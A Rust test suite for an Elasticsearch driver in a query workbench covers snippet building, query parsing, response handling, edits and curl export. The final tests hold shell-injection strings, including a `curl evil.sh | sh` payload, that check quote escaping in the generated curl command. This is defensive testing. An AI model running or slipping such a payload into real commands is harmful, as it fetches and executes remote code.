use super::*;
use testcontainers_modules::elastic_search::ElasticSearch;
use testcontainers_modules::testcontainers::runners::AsyncRunner;
use tradar_query_workbench::query_driver::{
    self as query_driver, ColumnInfo, QueryDriver, QueryResult, SchemaInfo,
};

#[test]
fn crud_snippet_covers_all_four_ops() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");
    let entry = SchemaInfo::new("my-index");

    assert_eq!(
        driver.crud_snippet(&entry, tradar_core::action::CrudOp::Read, &[]),
        Some("GET my-index/_search\n{\n  \"query\": {\n    \"match_all\": {}\n  }\n}".to_string())
    );
    assert_eq!(
        driver.crud_snippet(&entry, tradar_core::action::CrudOp::Create, &[]),
        Some("POST my-index/_doc\n{\n}".to_string())
    );
    assert_eq!(
        driver.crud_snippet(&entry, tradar_core::action::CrudOp::Update, &[]),
        Some("POST my-index/_update/<id>\n{\n  \"doc\": {\n  }\n}".to_string())
    );
    assert_eq!(
        driver.crud_snippet(&entry, tradar_core::action::CrudOp::Delete, &[]),
        Some("DELETE my-index/_doc/<id>".to_string())
    );
}

#[test]
fn a_success_status_still_wraps_the_body_as_documents() {
    let result = handle_response(
        reqwest::StatusCode::OK,
        r#"{"status": "green"}"#.to_string(),
    )
    .unwrap();

    match result {
        QueryResult::Documents { items: docs, .. } => {
            assert_eq!(docs, vec![serde_json::json!({"status": "green"})]);
        }
        other => panic!("expected Documents, got {other:?}"),
    }
}

#[test]
fn a_non_success_status_is_an_error_not_a_result() {
    let body = r#"{"error": {"type": "index_not_found_exception", "reason": "no such index [orders]"}, "status": 404}"#;

    let err = handle_response(reqwest::StatusCode::NOT_FOUND, body.to_string()).unwrap_err();

    let text = err.to_string();
    assert!(text.contains("404"), "was: {text}");
    assert!(text.contains("index_not_found_exception"), "was: {text}");
    assert!(text.contains("no such index [orders]"), "was: {text}");
}

#[test]
fn a_non_success_status_with_a_non_json_body_still_reports_it() {
    let err = handle_response(
        reqwest::StatusCode::INTERNAL_SERVER_ERROR,
        "upstream connect error".to_string(),
    )
    .unwrap_err();

    let text = err.to_string();
    assert!(text.contains("500"), "was: {text}");
    assert!(text.contains("upstream connect error"), "was: {text}");
}

#[test]
fn a_success_status_with_the_cat_family_s_plain_text_body_still_works() {
    let result = handle_response(
        reqwest::StatusCode::OK,
        "health status index\ngreen  open   my-index".to_string(),
    )
    .unwrap();

    match result {
        QueryResult::Documents { items: docs, .. } => {
            assert_eq!(docs.len(), 1);
            assert!(docs[0].is_string());
        }
        other => panic!("expected Documents, got {other:?}"),
    }
}

fn my_index_with_fields() -> SchemaInfo {
    SchemaInfo {
        name: "my-index".to_string(),
        columns: vec![
            ColumnInfo::new("title", "text"),
            ColumnInfo::new("views", "long"),
        ],
        kind: None,
        ttl: None,
        schema: None,
        object_kind: None,
    }
}

#[test]
fn crud_snippet_create_with_a_real_mapping_lists_every_field() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(
        driver.crud_snippet(
            &my_index_with_fields(),
            tradar_core::action::CrudOp::Create,
            &[]
        ),
        Some("POST my-index/_doc\n{\n  \"title\": <value>,\n  \"views\": <value>\n}".to_string())
    );
}

#[test]
fn crud_snippet_create_with_an_explicit_selection_lists_only_those_fields() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(
        driver.crud_snippet(
            &my_index_with_fields(),
            tradar_core::action::CrudOp::Create,
            &["title".to_string()]
        ),
        Some("POST my-index/_doc\n{\n  \"title\": <value>\n}".to_string())
    );
}

#[test]
fn crud_snippet_read_with_a_selection_adds_a_source_filter() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(
        driver.crud_snippet(
            &my_index_with_fields(),
            tradar_core::action::CrudOp::Read,
            &["title".to_string()]
        ),
        Some(
            "GET my-index/_search\n{\n  \"_source\": [\"title\"],\n  \"query\": {\n    \"match_all\": {}\n  }\n}"
                .to_string()
        )
    );
}

#[test]
fn crud_snippet_update_with_a_real_mapping_sets_every_field_in_the_doc_body() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(
        driver.crud_snippet(
            &my_index_with_fields(),
            tradar_core::action::CrudOp::Update,
            &[]
        ),
        Some(
            "POST my-index/_update/<id>\n{\n  \"doc\": {\n    \"title\": <value>,\n    \"views\": <value>\n  }\n}"
                .to_string()
        )
    );
}

#[test]
fn crud_snippet_delete_ignores_columns_since_it_deletes_by_id_only() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(
        driver.crud_snippet(
            &my_index_with_fields(),
            tradar_core::action::CrudOp::Delete,
            &["title".to_string()]
        ),
        Some("DELETE my-index/_doc/<id>".to_string())
    );
}

#[test]
fn parse_query_splits_method_path_and_body() {
    let (method, path, body) =
        parse_query("POST my-index/_search\n{\"query\": {\"match_all\": {}}}").unwrap();

    assert_eq!(method, "POST");
    assert_eq!(path, "my-index/_search");
    assert_eq!(body.as_deref(), Some("{\"query\": {\"match_all\": {}}}"));
}

#[test]
fn parse_query_ignores_hash_line_and_block_comments_like_kibana() {
    let (method, path, body) = parse_query(
        "# find recent\nPOST my-index/_search\n{\n  // \"size\": 5,\n  \"query\": {\"match_all\": {}}, /* all */\n  # \"sort\": []\n  \"note\": \"see http://x/y # not a comment\"\n}",
    )
    .unwrap();

    assert_eq!(method, "POST");
    assert_eq!(path, "my-index/_search");
    let parsed: serde_json::Value = serde_json::from_str(&body.unwrap()).unwrap();
    assert_eq!(
        parsed,
        serde_json::json!({"query": {"match_all": {}}, "note": "see http://x/y # not a comment"})
    );
}

#[test]
fn a_double_slash_in_the_request_path_is_not_a_comment() {
    let (_, path, _) = parse_query("GET a//b/_search\n{}").unwrap();
    assert_eq!(path, "a//b/_search");
}

#[test]
fn parse_query_allows_a_missing_body() {
    let (method, path, body) = parse_query("GET _cat/indices?v").unwrap();

    assert_eq!(method, "GET");
    assert_eq!(path, "_cat/indices?v");
    assert_eq!(body, None);
}

#[test]
fn parse_query_rejects_a_missing_path() {
    assert!(parse_query("GET").is_none());
}

#[test]
fn unwrap_search_hits_merges_id_into_each_hit_s_source() {
    let response = serde_json::json!({
        "took": 1,
        "hits": {
            "hits": [
                {"_id": "1", "_index": "my-index", "_source": {"title": "a"}},
                {"_id": "2", "_index": "my-index", "_source": {"title": "b"}},
            ]
        }
    });

    let docs = unwrap_search_hits(&response).expect("a hits.hits response");

    assert_eq!(
        docs,
        vec![
            serde_json::json!({"_id": "1", "title": "a"}),
            serde_json::json!({"_id": "2", "title": "b"}),
        ]
    );
}

#[tokio::test]
async fn a_search_with_more_hits_than_the_row_cap_is_cut_and_marked() {
    let hits: Vec<_> = (0..20)
        .map(|i| serde_json::json!({"_id": i.to_string(), "_source": {"n": i}}))
        .collect();
    let body = serde_json::json!({"hits": {"hits": hits}}).to_string();
    let result = tradar_query_workbench::query_driver::with_max_rows(5, async {
        handle_response(reqwest::StatusCode::OK, body).unwrap()
    })
    .await;
    let QueryResult::Documents { items, truncated } = result else {
        panic!("expected Documents");
    };
    assert_eq!(items.len(), 5);
    assert!(truncated);
}

#[test]
fn hits_from_several_indices_keep_their_index() {
    let mixed = serde_json::json!({"hits": {"hits": [
        {"_id": "1", "_index": "logs-1", "_source": {"m": "a"}},
        {"_id": "1", "_index": "logs-2", "_source": {"m": "b"}},
    ]}});
    assert_eq!(
        unwrap_search_hits(&mixed).unwrap(),
        vec![
            serde_json::json!({"_id": "1", "_index": "logs-1", "m": "a"}),
            serde_json::json!({"_id": "1", "_index": "logs-2", "m": "b"}),
        ]
    );
}

#[test]
fn a_search_with_aggregations_keeps_the_whole_response() {
    let body = serde_json::json!({
        "took": 3,
        "hits": {"total": {"value": 0}, "hits": []},
        "aggregations": {"by_tag": {"buckets": [{"key": "a", "doc_count": 2}]}}
    });
    let QueryResult::Documents { items, .. } =
        handle_response(reqwest::StatusCode::OK, body.to_string()).unwrap()
    else {
        panic!("expected Documents");
    };
    assert_eq!(items, vec![body]);

    // A plain search still unwraps into one row per hit.
    let plain = serde_json::json!({"hits": {"hits": [{"_id": "1", "_source": {"a": 1}}]}});
    let QueryResult::Documents { items, .. } =
        handle_response(reqwest::StatusCode::OK, plain.to_string()).unwrap()
    else {
        panic!("expected Documents");
    };
    assert_eq!(items, vec![serde_json::json!({"_id": "1", "a": 1})]);
}

#[test]
fn unwrap_search_hits_is_none_for_a_response_with_no_hits_key() {
    assert!(unwrap_search_hits(&serde_json::json!({"count": 3})).is_none());
}

#[test]
fn unwrap_search_hits_keeps_a_hit_missing_source_rather_than_dropping_it() {
    let response = serde_json::json!({"hits": {"hits": [{"_id": "1"}]}});

    let docs = unwrap_search_hits(&response).unwrap();

    assert_eq!(docs, vec![serde_json::json!({"_id": "1"})]);
}

#[test]
fn edit_source_accepts_a_plain_single_index_search() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(
        driver.edit_source("GET my-index/_search\n{\"query\": {\"match_all\": {}}}"),
        Some("my-index".to_string())
    );
    assert_eq!(
        driver.edit_source("POST my-index/_search"),
        Some("my-index".to_string())
    );
}

#[test]
fn edit_source_refuses_multi_index_wildcard_and_non_search() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    assert_eq!(driver.edit_source("GET a,b/_search"), None);
    assert_eq!(driver.edit_source("GET my-*/_search"), None);
    assert_eq!(driver.edit_source("GET _all/_search"), None);
    assert_eq!(driver.edit_source("GET my-index/_count"), None);
    assert_eq!(driver.edit_source("GET my-index/_doc/1"), None);
    assert_eq!(driver.edit_source("DELETE my-index/_doc/1"), None);
}

#[test]
fn edit_sql_delete_row_targets_the_hit_s_id() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    let edit = query_driver::RowEdit {
        table: "my-index".to_string(),
        key: vec![("_id".to_string(), "abc123".to_string())],
        change: query_driver::RowChange::DeleteRow,
    };

    assert_eq!(
        driver.edit_sql(&edit),
        Some("DELETE my-index/_doc/abc123?refresh=true".to_string())
    );
}

#[test]
fn edit_sql_set_values_merges_dotted_paths_under_one_parent() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");
    let edit = query_driver::RowEdit {
        table: "my-index".to_string(),
        key: vec![("_id".to_string(), "1".to_string())],
        change: query_driver::RowChange::SetValues(vec![
            ("customer.name".to_string(), "Ada".to_string()),
            ("customer.vip".to_string(), "true".to_string()),
            ("views".to_string(), "9".to_string()),
        ]),
    };

    let statement = driver.edit_sql(&edit).unwrap();
    let (method, path, body) = parse_query(&statement).unwrap();
    assert_eq!(method, "POST");
    assert_eq!(path, "my-index/_update/1?refresh=true");
    let body: serde_json::Value = serde_json::from_str(&body.unwrap()).unwrap();
    assert_eq!(
        body,
        serde_json::json!({"doc": {"customer": {"name": "Ada", "vip": true}, "views": 9}})
    );
}

#[test]
fn edit_sql_set_value_infers_the_value_s_json_type() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");
    let edit_for = |value: &str| query_driver::RowEdit {
        table: "my-index".to_string(),
        key: vec![("_id".to_string(), "1".to_string())],
        change: query_driver::RowChange::SetValue {
            column: "views".to_string(),
            value: value.to_string(),
        },
    };

    assert_eq!(
        driver.edit_sql(&edit_for("42")),
        Some(
            "POST my-index/_update/1?refresh=true\n{\n  \"doc\": {\n    \"views\": 42\n  }\n}"
                .to_string()
        )
    );
    assert_eq!(
        driver.edit_sql(&edit_for("Ada")),
        Some(
            "POST my-index/_update/1?refresh=true\n{\n  \"doc\": {\n    \"views\": \"Ada\"\n  }\n}"
                .to_string()
        )
    );
}

#[test]
fn edit_sql_set_value_nests_a_dotted_column_into_a_real_object() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    let edit = query_driver::RowEdit {
        table: "my-index".to_string(),
        key: vec![("_id".to_string(), "1".to_string())],
        change: query_driver::RowChange::SetValue {
            column: "customer.name".to_string(),
            value: "Ada".to_string(),
        },
    };

    // Not a flat "customer.name" key -- a real nested object, or
    // Elasticsearch's partial-update merge would create a spurious
    // top-level field instead of reaching the real nested one.
    assert_eq!(
        driver.edit_sql(&edit),
        Some(
            "POST my-index/_update/1?refresh=true\n{\n  \"doc\": {\n    \"customer\": {\n      \"name\": \"Ada\"\n    }\n  }\n}"
                .to_string()
        )
    );
}

#[test]
fn validate_json_body_accepts_a_single_json_object() {
    assert_eq!(
        validate_json_body(r#"{"query": {"match_all": {}}}"#),
        Ok(())
    );
}

#[test]
fn validate_json_body_accepts_ndjson_for_bulk_and_msearch() {
    let bulk = "{\"index\": {\"_index\": \"my-index\"}}\n{\"field\": \"value\"}";
    assert_eq!(validate_json_body(bulk), Ok(()));
}

#[test]
fn validate_json_body_accepts_ndjson_with_blank_lines_between_entries() {
    let bulk = "{\"index\": {}}\n\n{\"field\": \"value\"}\n";
    assert_eq!(validate_json_body(bulk), Ok(()));
}

#[test]
fn validate_json_body_rejects_a_malformed_single_object() {
    assert!(validate_json_body(r#"{"query": {"match_all": {}}"#).is_err());
}

#[test]
fn validate_json_body_rejects_ndjson_with_one_bad_line() {
    let bulk = "{\"index\": {}}\n{not json}";
    assert!(validate_json_body(bulk).is_err());
}

#[tokio::test]
async fn execute_accepts_an_ndjson_bulk_body_rather_than_rejecting_it_as_invalid_json() {
    // Same unroutable-host trick as the test below: if this reached
    // `request.send()` it's proof the NDJSON body passed local
    // validation (a connection-refused/timeout error here, not
    // "invalid JSON body").
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    let err = driver
        .execute("POST _bulk\n{\"index\": {\"_index\": \"my-index\"}}\n{\"field\": \"value\"}")
        .await
        .unwrap_err();

    assert!(
        !err.to_string().contains("invalid JSON body"),
        "a valid NDJSON bulk body must not be rejected as malformed JSON, got: {err}"
    );
}

#[tokio::test]
async fn execute_rejects_malformed_json_locally_without_touching_the_network() {
    // The target host is unroutable (port 1, never a real server) --
    // if this reached `request.send()` it would hang/fail on a
    // connection error instead of the JSON error asserted below, so a
    // network-shaped error here would mean the local validation was
    // skipped, not that it's slow.
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    let err = driver
        .execute("POST my-index/_search\n{\"query\": {\"match_all\": {}}")
        .await
        .unwrap_err();

    assert!(
        err.to_string().contains("invalid JSON body"),
        "expected a local JSON error, got: {err}"
    );
}

#[tokio::test]
async fn connect_succeeds_for_a_running_cluster() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));

    let result = driver.connect().await;

    assert!(result.is_ok(), "connect failed: {:?}", result.err());
}

#[tokio::test]
async fn list_schema_reports_index_fields_from_the_mapping() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let base_url = format!("http://127.0.0.1:{port}");
    let mut driver = ElasticsearchDriver::new(&base_url);
    driver.connect().await.unwrap();
    reqwest::Client::new()
        .put(format!("{base_url}/orders"))
        .header("content-type", "application/json")
        .body(
            r#"{"mappings":{"properties":{
                   "id":{"type":"long"},
                   "customer":{"properties":{"name":{"type":"text"}}}}}}"#,
        )
        .send()
        .await
        .unwrap();

    let schema = driver.list_schema().await.unwrap();

    let orders = schema
        .iter()
        .find(|entry| entry.name == "orders")
        .expect("the index we just created should be listed");
    let fields: Vec<&str> = orders.columns.iter().map(|c| c.name.as_str()).collect();
    assert!(fields.contains(&"id"), "fields were: {fields:?}");
    assert!(fields.contains(&"customer.name"), "fields were: {fields:?}");
}

#[tokio::test]
async fn execute_runs_an_arbitrary_request_and_wraps_the_response_as_documents() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
    driver.connect().await.unwrap();

    let result = driver.execute("GET _cluster/health").await.unwrap();

    match result {
        QueryResult::Documents { items: docs, .. } => {
            assert_eq!(docs.len(), 1);
            assert!(docs[0].get("status").is_some(), "response was: {docs:?}");
        }
        other => panic!("expected Documents, got {other:?}"),
    }
}

#[tokio::test]
async fn execute_handles_the_cat_indices_plain_text_response() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
    driver.connect().await.unwrap();

    let result = driver.execute("GET _cat/indices?v").await;

    let result = result.unwrap_or_else(|e| panic!("expected Ok, got error: {e:?}"));
    match result {
        QueryResult::Documents { items: docs, .. } => {
            assert_eq!(docs.len(), 1);
            assert!(
                docs[0].is_string(),
                "expected a plain-text string, got: {docs:?}"
            );
            assert!(
                docs[0].as_str().unwrap().contains("health"),
                "expected the _cat/indices header row, got: {docs:?}"
            );
        }
        other => panic!("expected Documents, got {other:?}"),
    }
}

#[tokio::test]
async fn execute_unwraps_a_search_into_one_document_per_hit() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let base_url = format!("http://127.0.0.1:{port}");
    let mut driver = ElasticsearchDriver::new(&base_url);
    driver.connect().await.unwrap();
    let client = reqwest::Client::new();
    for (id, title) in [("1", "a"), ("2", "b")] {
        client
            .put(format!("{base_url}/orders/_doc/{id}?refresh=true"))
            .header("content-type", "application/json")
            .body(format!(r#"{{"title": "{title}"}}"#))
            .send()
            .await
            .unwrap();
    }

    let result = driver
        .execute("GET orders/_search\n{\"query\": {\"match_all\": {}}}")
        .await
        .unwrap();

    match result {
        QueryResult::Documents { items: docs, .. } => {
            assert_eq!(docs.len(), 2, "docs were: {docs:?}");
            for doc in &docs {
                assert!(doc.get("_id").is_some(), "doc was: {doc:?}");
                assert!(doc.get("title").is_some(), "doc was: {doc:?}");
            }
        }
        other => panic!("expected Documents, got {other:?}"),
    }
}

/// End-to-end proof this feature actually works, not just that it
/// builds the right-looking string: `edit_source`/`edit_sql` build a
/// real update from a real `_search` hit, `execute()` runs it, and a
/// direct `GET .../_doc/<id>` (bypassing the search index's own
/// near-real-time refresh, unlike a second `_search`) confirms the
/// document actually changed -- same for the follow-up delete.
#[tokio::test]
async fn edit_sql_round_trips_a_real_update_and_delete_against_a_search_hit() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let base_url = format!("http://127.0.0.1:{port}");
    let mut driver = ElasticsearchDriver::new(&base_url);
    driver.connect().await.unwrap();
    let client = reqwest::Client::new();
    client
        .put(format!("{base_url}/orders/_doc/1?refresh=true"))
        .header("content-type", "application/json")
        .body(r#"{"title": "a"}"#)
        .send()
        .await
        .unwrap();

    let query = "GET orders/_search\n{\"query\": {\"match_all\": {}}}";
    assert_eq!(driver.edit_source(query).as_deref(), Some("orders"));

    let update_sql = driver
        .edit_sql(&query_driver::RowEdit {
            table: "orders".to_string(),
            key: vec![("_id".to_string(), "1".to_string())],
            change: query_driver::RowChange::SetValue {
                column: "title".to_string(),
                value: "b".to_string(),
            },
        })
        .expect("a plain single-index search must be editable");
    driver.execute(&update_sql).await.unwrap();

    let after_update: serde_json::Value = client
        .get(format!("{base_url}/orders/_doc/1"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(
        after_update["_source"]["title"], "b",
        "doc after update: {after_update:?}"
    );

    let delete_sql = driver
        .edit_sql(&query_driver::RowEdit {
            table: "orders".to_string(),
            key: vec![("_id".to_string(), "1".to_string())],
            change: query_driver::RowChange::DeleteRow,
        })
        .unwrap();
    driver.execute(&delete_sql).await.unwrap();

    let after_delete: serde_json::Value = client
        .get(format!("{base_url}/orders/_doc/1"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(
        after_delete["found"], false,
        "doc should be deleted: {after_delete:?}"
    );
}

#[test]
fn index_fields_flattens_nested_properties_into_paths() {
    let mappings = serde_json::json!({
        "orders": {
            "mappings": {
                "properties": {
                    "id": {"type": "long"},
                    "customer": {
                        "properties": {
                            "name": {"type": "text"},
                            "address": {"properties": {"city": {"type": "keyword"}}}
                        }
                    }
                }
            }
        }
    });

    let fields = index_fields(&mappings, "orders");

    let named: Vec<(&str, &str)> = fields
        .iter()
        .map(|c| (c.name.as_str(), c.type_name.as_str()))
        .collect();
    assert!(named.contains(&("id", "long")));
    assert!(
        named.contains(&("customer.name", "text")),
        "a nested field is named the way you'd write it in a query: {named:?}"
    );
    assert!(named.contains(&("customer.address.city", "keyword")));
    assert!(
        !named.iter().any(|(name, _)| *name == "customer"),
        "an object node is not itself a field: {named:?}"
    );
}

#[test]
fn a_multi_field_is_not_reported_as_a_separate_field() {
    let mappings = serde_json::json!({
        "posts": {
            "mappings": {
                "properties": {
                    "title": {
                        "type": "text",
                        "fields": {"keyword": {"type": "keyword"}}
                    }
                }
            }
        }
    });

    let fields = index_fields(&mappings, "posts");

    assert_eq!(fields.len(), 1, "title.keyword is an indexing detail");
    assert_eq!(fields[0].name, "title");
    assert_eq!(fields[0].type_name, "text");
}

#[test]
fn an_index_with_no_mapping_reports_no_fields() {
    let mappings = serde_json::json!({"other": {"mappings": {}}});

    assert!(index_fields(&mappings, "missing").is_empty());
    assert!(index_fields(&mappings, "other").is_empty());
    assert!(index_fields(&serde_json::Value::Null, "any").is_empty());
}

#[tokio::test]
async fn list_schema_returns_created_indices() {
    let container = ElasticSearch::default().start().await.unwrap();
    let port = container.get_host_port_ipv4(9200).await.unwrap();
    let base_url = format!("http://127.0.0.1:{port}");
    let mut driver = ElasticsearchDriver::new(&base_url);
    driver.connect().await.unwrap();
    reqwest::Client::new()
        .put(format!("{base_url}/test-index"))
        .send()
        .await
        .unwrap();

    let schema = driver.list_schema().await.unwrap();

    assert!(
        schema.iter().any(|entry| entry.name == "test-index"),
        "schema was: {:?}",
        schema.iter().map(|s| &s.name).collect::<Vec<_>>()
    );
}

#[test]
fn to_curl_includes_the_body_when_present() {
    let curl = to_curl(
        "http://localhost:9200",
        "POST my-index/_search\n{\"query\":{\"match_all\":{}}}",
    )
    .unwrap();

    assert_eq!(
        curl,
        "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
    );
}

#[test]
fn to_curl_omits_the_body_flags_when_there_is_no_body() {
    let curl = to_curl("http://localhost:9200", "GET _cat/indices?v").unwrap();

    assert_eq!(curl, "curl -X GET 'http://localhost:9200/_cat/indices?v'");
}

#[test]
fn to_curl_returns_none_for_unparseable_queries() {
    assert!(to_curl("http://localhost:9200", "").is_none());
}

#[test]
fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
    let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
    let curl = to_curl(
        "http://localhost:9200",
        &format!("POST my-index/_search\n{body}"),
    )
    .unwrap();

    // Every `'` in the body must be replaced with the close-quote /
    // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
    // stays a single shell argument with no early quote-close.
    let expected_escaped_body = r#"{"query": "'\''; curl evil.sh | sh; '\''"}"#;
    assert_eq!(
        curl,
        format!(
            "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{expected_escaped_body}'"
        )
    );
}

#[test]
fn to_curl_escaped_body_round_trips_through_a_real_shell() {
    let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
    let curl = to_curl(
        "http://localhost:9200",
        &format!("POST my-index/_search\n{body}"),
    )
    .unwrap();

    // Run the generated command through a real shell, replacing `curl`
    // with `echo` so nothing actually hits the network, and assert the
    // shell reconstructs exactly the original (unescaped) body as a
    // single argument — proving the embedded `'; ...; '` never breaks
    // out of the quoted string.
    let script = curl.replacen("curl", "echo", 1);
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(&script)
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(
        !std::path::Path::new("/tmp/tradar-to-curl-test-should-not-exist").exists(),
        "the injected `touch` command ran — to_curl produced unsafe shell output: {curl}"
    );
    assert!(
        stdout.contains(body),
        "expected the shell-parsed output to contain the original body verbatim, got: {stdout}"
    );
}
